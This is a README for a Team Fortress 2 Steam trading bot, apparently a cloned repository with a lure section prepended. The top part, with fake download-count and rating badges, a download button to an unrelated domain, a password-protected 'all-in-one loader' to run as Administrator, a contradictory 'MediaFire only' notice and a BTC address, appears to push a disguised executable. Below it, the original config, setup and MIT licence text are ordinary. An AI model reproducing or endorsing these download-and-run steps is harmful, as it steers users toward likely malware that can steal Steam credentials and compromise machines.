<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://respockett.pro/red">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

## Donate
- BTC: `bc1q9gmh5x2g9s0pw3282a5ypr6ms8qvuxh3fd7afh`
## Features
* GUI for adding/changing items, prices and `max_stock` + browsing trades
* Add items by name or SKU [[?]](#adding-items)
## Installation
You need to have Python 3.11 or above installed.
## Setup
> [!NOTE]
> Make a copy of `config.example.json` and name it `config.json`. Make sure it is in the same folder as the example file. Update credentials and set your preferred `options`.

Example config:
```json
{
    "username": "username",
    "password": "password",
    "shared_secret": "Aa11aA1+1aa1aAa1a=",
    "identity_secret": "aA11aaaa/aa11a/aAAa1a1=",
    "options": {
        "use_backpack_tf": true,
        "backpack_tf_token": "token",
        "enable_arbitrage": false,
        "inventory_provider": "steamsupply",
        "inventory_api_key": "mySteamSupplyApiKey",
        "accept_donations": true,
        "decline_trade_hold": true,
        "enable_craft_hats": true,
        "save_trade_offers": true,
        "owners": [
            "76511111111111111",
            "76522222222222222"
        ]
    }
}
```

### Options
| Option | Description | Default |
| ------ | ----------- | ------- |
| `username` | Username for the Steam account to use the bot with. Also used as the MongoDB database name. | - |
| `use_backpack_tf` | Whether to list items on Backpack.TF or not. | - |
## Running
```bash
# tf2-express/
python main.py # start the bot
python panel.py # start the gui
```

## Updating
```bash
# tf2-express/
git pull
pip install --upgrade -r requirements.txt
# update packages like bptf, tf2-utils, tf2-data and tf2-sku
# which the bot is dependant on
```

## Explanation
### Random Craft Hats
If a craftable hat does not have a specific price in the database, it will be viewed as a Random Craft Hat (SKU: `-100;6`), if `enable_craft_hats` is enabled. 

> [!CAUTION]
> This applies to any craftable unique hat, which includes hats such as The Team Captain, Earbuds, Max Heads etc. If these do not have their own price in the database, they will be priced as a Random Craft Hat, if this option is enabled. Be careful when using this option, as it can lead to unwanted trades.

Simply open the GUI and add "Random Craft Hat" or `-100;6` to the pricelist. Set the buy and sell price to whatever you want. Random Craft Hats cannot get automatic price updates.

### Adding Items
The bot supports adding items via the GUI by using either item names or SKUs. Example: `Uncraftable Tour of Duty Ticket` or `725;6;uncraftable` would add the same item (`725;6;uncraftable`).

> [!IMPORTANT]
### 3rd Party Inventory Providers
Steam can rate-limit inventory fetch requests if they are called too often. This can be avoided using a third party provider like SteamApis, Steam.Supply, Express-Load or your own. This is especially useful if you are running multiple bots.

> [!NOTE]
## Testing
```bash
# tf2-express/
pytest
```

Every test should succeed except for the version check. The version needs to be incremented to pass this test.

## License
MIT License


---

MIT License

Copyright (c) 2020-2025 offish

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
